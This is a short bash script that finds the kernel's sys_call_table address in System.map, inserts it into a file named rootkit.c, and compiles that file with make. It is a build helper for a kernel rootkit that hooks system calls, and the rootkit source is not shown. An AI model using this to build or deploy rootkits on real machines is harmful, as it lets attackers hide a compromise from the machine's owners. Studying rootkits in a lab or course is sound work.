#!/bin/bash

#find the system call table address through shell commands, and insert into the .c file
TABLE=$(grep sys_call_table /boot/System.map-$(uname -r) |awk 'NR==1{print $1}')
sed -i s/TABLE/$TABLE/g rootkit.c
 
make
